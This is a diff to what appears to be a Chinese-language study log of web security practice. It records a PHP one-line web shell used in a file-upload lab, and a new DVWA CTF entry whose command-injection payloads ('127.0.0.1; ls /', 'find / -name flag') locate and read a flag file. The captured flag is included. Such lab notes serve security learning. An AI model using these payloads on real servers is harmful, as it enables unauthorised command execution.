@@ -45,3 +45,11 @@
   - **WebShell**：上传了 `<?php system($_GET['cmd']); ?>` 一句话木马。
   - **命令执行**：通过 `shell.php?cmd=whoami` 成功执行了服务器系统命令。
   - **防御思路**：白名单校验后缀（只允许 jpg/png 等）、重命名文件、将上传目录设置为不可执行。
+
+  ### 练习 7：CTF² 平台实战首杀（Web-DVWA）
+- **状态**：🟢 **已解出 (First Blood!)** 
+- **Get Flag**: `CTF{5cd4def-1530-42b6-9280-ef43a48a229f}`
+- **攻击路径**：
+  1. `127.0.0.1; ls /` 探测目录。
+  2. `127.0.0.1; find / -name "*flag*"` 锁定 `/var/www/html/flag.php`。
+  3. 浏览器直接访问 `/flag.php` 成功读取。
